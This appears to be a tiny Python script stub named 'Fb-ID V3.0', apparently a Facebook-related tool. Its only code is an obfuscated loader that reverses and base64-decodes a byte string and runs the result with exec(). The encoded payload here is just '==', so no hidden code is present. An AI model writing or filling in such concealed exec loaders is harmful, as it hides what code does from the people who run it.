# Created by MrUser#
#Fb-ID V3.0#
#Please Follow my github channel#
# -------------------------------
_ = lambda __ : __import__('base64').b64decode(__[::-1]);exec((_)(b'=='))